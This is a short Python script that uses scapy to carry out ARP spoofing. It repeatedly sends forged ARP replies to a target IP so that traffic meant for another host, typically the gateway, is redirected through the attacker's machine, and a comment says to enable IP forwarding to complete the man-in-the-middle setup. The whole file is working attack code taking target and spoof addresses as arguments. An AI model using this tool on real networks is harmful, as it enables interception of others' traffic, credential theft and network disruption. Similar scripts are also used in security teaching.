#/usr/bin/env python

# echo 1 > /proc/sys/net/ipv4/ip_forward
# enable portforwarding


import scapy.all as scapy
import argparse
import time

DEST_MAC = "ff:ff:ff:ff:ff:ff"
IP = "IP"
MAC = "MAC"

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet)

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst=DEST_MAC)
    packet = broadcast/arp_req
    ans = scapy.srp(packet, timeout=1, verbose=False)[0]

    return ans[0][1].hwsrc

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-s", "--spoof", dest="spoof", help="Spoof IO")
    options = parser.parse_args()
    return options

options = get_args()

while True:
    spoof(options.target, options.spoof)
    time.sleep(2)
